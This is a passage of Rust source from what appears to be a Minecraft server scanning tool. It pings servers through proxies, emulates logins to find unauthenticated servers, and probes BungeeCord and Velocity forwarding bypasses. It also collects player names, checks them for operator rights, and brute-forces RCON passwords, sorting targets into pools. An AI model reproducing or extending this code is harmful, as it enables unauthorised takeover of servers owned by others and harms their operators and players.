    // 1. Handshake packet (Packet ID 0x00, NextState = 1)
    let mut handshake = Vec::new();
    utils::write_varint(0x00, &mut handshake);
    utils::write_varint(47, &mut handshake);
    utils::write_string(domain, &mut handshake);
    handshake.extend_from_slice(&port.to_be_bytes());
    utils::write_varint(1, &mut handshake);

    let hs_packet = utils::wrap_packet(&handshake);
    stream.write_all(&hs_packet).await?;

    // 2. Status Request packet (Packet ID 0x00)
    let req_packet = [0x01, 0x00];
    stream.write_all(&req_packet).await?;

    // 3. Status Response packet
    let (packet_id, data) = utils::read_packet(stream).await?;
    if packet_id != 0x00 {
        return Err("Invalid status packet ID".into());
    }

    // Parse String VarInt length
    let mut i = 0;
    let mut num_read = 0;
    let mut str_len: i32 = 0;
    loop {
        if i >= data.len() {
            return Err("EOF parsing JSON string length".into());
        }
        let read = data[i];
        i += 1;
        let value = (read & 0b01111111) as i32;
        str_len |= value << (7 * num_read);
        num_read += 1;
        if num_read > 5 {
            return Err("VarInt string length overflow".into());
        }
        if (read & 0b10000000) == 0 {
            break;
        }
    }

    if str_len <= 0 || (str_len as usize) > (data.len().saturating_sub(i)) {
        return Err("Invalid JSON string payload length".into());
    }

    let json_bytes = &data[i..i + (str_len as usize)];
    let json: serde_json::Value = serde_json::from_slice(json_bytes)?;

    let version_name = json["version"]["name"]
        .as_str()
        .unwrap_or("Unknown")
        .to_string();
    let protocol = json["version"]["protocol"].as_i64().unwrap_or(47) as i32;
    let online_players = json["players"]["online"].as_u64().unwrap_or(0) as usize;
    let max_players = json["players"]["max"].as_u64().unwrap_or(0) as usize;

    let description = if let Some(desc_str) = json["description"].as_str() {
        desc_str.to_string()
    } else if let Some(text_str) = json["description"]["text"].as_str() {
        text_str.to_string()
    } else {
        json["description"].to_string()
    };

    let mut sample_players = Vec::new();
    if let Some(samples) = json["players"]["sample"].as_array() {
        for s in samples {
            if let Some(name) = s["name"].as_str() {
                sample_players.push(utils::clean_motd(name));
            }
        }
    }

    Ok(ServerStatusPong {
        version: version_name,
        protocol,
        online_players,
        max_players,
        description,
        sample: sample_players,
    })
}

#[derive(Clone, Debug)]
pub struct JavaCheckResult {
    pub info: String,
    pub version: String,
    pub online_players: i32,
    pub max_players: i32,
    pub geo: String,
    pub req_reason: String,
    pub is_cracked: bool,
    pub is_registered: bool,
    pub is_op: bool,
    pub needs_mods: bool,
    pub is_bungee_vulnerable: bool,
    pub is_velocity_vulnerable: bool,
    pub has_builds: bool,
    pub movement_restricted: bool,
    pub players: Vec<String>,
    pub rcon_pass: Option<String>,
    pub plugins: Option<String>,
}

pub async fn check_java(
    connect_ip: &str,
    port: u16,
    target_version: &str,
    test_nick: &str,
    domain: &str,
    current_proxy: Option<String>,
) -> Result<Option<JavaCheckResult>, String> {
    let host_port = format!("{}:{}", connect_ip, port);
    
    let mut stream = match proxy::connect_stream(&host_port, current_proxy.clone().as_deref()).await {
        Ok(s) => s,
        Err(e) => return Err(e.to_string()),
    };

    let pong = match safe_minecraft_ping(&mut stream, domain, port).await {
        Ok(p) => p,
        Err(_) => return Ok(None),
    };
    drop(stream); // Close ping connection immediately

    if !target_version.is_empty() && !pong.version.contains(target_version) { return Ok(None); }
    
    let cleaned_motd = utils::clean_motd(&pong.description);
    let motd_lower = cleaned_motd.to_lowercase();
    
    let geo = utils::get_geo(connect_ip).await;
    let (is_cracked, is_registered, is_op, mut needs_mods, mut bs, mut req, world_has_builds, movement_restricted, login_players) = emulate_login(connect_ip, port, pong.protocol, &motd_lower, test_nick, domain, current_proxy.clone()).await;

    let motd_has_whitelist = motd_lower.contains("whitelist") 
        || motd_lower.contains("white-list") 
        || motd_lower.contains("белый список") 
        || motd_lower.contains("вайтлист") 
        || motd_lower.contains("белом списке")
        || motd_lower.contains("белого списка")
        || motd_lower.contains("в белом списке");
    if motd_has_whitelist {
        bs = "bs".to_string();
        req = "[Вайтлист]".to_string();
    }

    let pong_ver_lower = pong.version.to_lowercase();
    let is_modded = pong_ver_lower.contains("forge")
        || pong_ver_lower.contains("neo")
        || pong_ver_lower.contains("fabric")
        || pong_ver_lower.contains("quilt")
        || pong_ver_lower.contains("modded")
        || motd_lower.contains("neoforge")
        || motd_lower.contains("forge")
        || motd_lower.contains("fabric");

    if is_modded {
        needs_mods = true;
        if req.contains("[Вход свободен]") || req.is_empty() {
            req = "[Требуются моды (Forge/NeoForge/Fabric)]".to_string();
        }
    }

    let mut is_bungee_vulnerable = false;
    let mut is_velocity_vulnerable = false;
    
    let req_lower = req.to_lowercase();
    if req_lower.contains("ip forwarding") || req_lower.contains("bungeecord") || req_lower.contains("velocity") || req_lower.contains("forwarding") {
        is_bungee_vulnerable = check_bungee_bypass(connect_ip, port, pong.protocol, domain, test_nick, current_proxy.clone()).await;
        is_velocity_vulnerable = check_velocity_bypass(connect_ip, port, pong.protocol, domain, test_nick, current_proxy.clone()).await;
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // Slot Count Rule: Nicknames and OP checks ONLY on servers with <= 49 slots!
    // If max_players > 49 (or max_players == 0), nicknames are NEVER extracted,
    // and server is NEVER routed to Plus or Exclusive pools.
    // ═══════════════════════════════════════════════════════════════════════════
    let is_small_server = pong.max_players > 0 && pong.max_players <= 49;

    let mut players_list = Vec::new();
    let mut final_is_op = false;
    let mut op_player_name = None;
    let mut rcon_pass = None;
    let mut plugins = None;

    if is_small_server {
        let (q_plugins, query_players) = query_server_full(connect_ip, port).await;
        plugins = q_plugins;
        let web_map_players = fetch_web_map_players(connect_ip, current_proxy.clone()).await;

        let mut players_set = std::collections::HashSet::new();
        for p in &pong.sample {
            let clean = p.trim().to_string();
            if is_valid_mc_player_name(&clean, test_nick) {
                players_set.insert(clean);
            }
        }
        for p in query_players {
            let clean = p.trim().to_string();
            if is_valid_mc_player_name(&clean, test_nick) {
                players_set.insert(clean);
            }
        }
        for p in login_players {
            let clean = p.trim().to_string();
            if is_valid_mc_player_name(&clean, test_nick) {
                players_set.insert(clean);
            }
        }
        for p in web_map_players {
            let clean = p.trim().to_string();
            if is_valid_mc_player_name(&clean, test_nick) {
                players_set.insert(clean);
            }
        }
        players_list = players_set.into_iter().collect();
        players_list.sort();

        // Check up to the first 5 discovered players for OP permissions (ONLY for <= 99 slots)
        if is_cracked && !players_list.is_empty() {
            for target_p in players_list.iter().take(5) {
                if check_player_op(connect_ip, port, pong.protocol, domain, target_p, current_proxy.clone()).await {
                    op_player_name = Some(target_p.clone());
                    break;
                }
            }
        }

        rcon_pass = if port == 25565 { rcon_brute(connect_ip).await } else { None };
        final_is_op = is_op || rcon_pass.is_some() || op_player_name.is_some();
    }

    let mut admin = "?admin".to_string();
    if !players_list.is_empty() {
        admin = players_list.join(", ");
    }

    let lic_str = if is_cracked { "nolic" } else { "lic" };
    let bs_str = if bs == "bs" { "bs" } else if bs == "nobs" { "nobs" } else { "?bs" };
    let reg_str = if is_registered { "reg" } else { "noreg" };
    let mov_str = if movement_restricted { "movrest" } else { "movfree" };
    let op_str = if final_is_op { "op" } else { "noop" };

    let has_builds = check_builds_indicators(&motd_lower, &pong.version, pong.online_players, &players_list, plugins.as_deref(), world_has_builds);
    let build_str = if has_builds { "buildyes" } else { "buildno" };
    
    if !is_cracked && !needs_mods && bs != "bs" { req = "".to_string(); }
    let cheat_str = if let Some(ref op_n) = op_player_name {
        format!("[ОП: {}] ", op_n)
    } else if final_is_op {
        "[ОП/КРЕАТИВ ВКЛЮЧЕН] ".to_string()
    } else {
        "".to_string()
    };
    
    let rcon_str = match &rcon_pass {
        Some(pass) => format!(", RCON pass: {}", pass),
        None => "".to_string(),
    };

    let req_reason = req.clone();

    let mut info = format!("Java | {} ({}, {}, {}, {}, {}, {}{}) {}{} {} | {}/{} online | {}", 
        pong.version, lic_str, bs_str, reg_str, mov_str, op_str, build_str, rcon_str, admin, cheat_str, req, pong.online_players, pong.max_players, geo);
    
    info = info.replace("  |", " |");

    Ok(Some(JavaCheckResult {
        info,
        version: pong.version,
        online_players: pong.online_players as i32,
        max_players: pong.max_players as i32,
        geo,
        req_reason,
        is_cracked,
        is_registered,
        is_op: final_is_op,
        needs_mods,
        is_bungee_vulnerable,
        is_velocity_vulnerable,
        has_builds,
        movement_restricted,
        players: players_list,
        rcon_pass,
        plugins,
    }))
}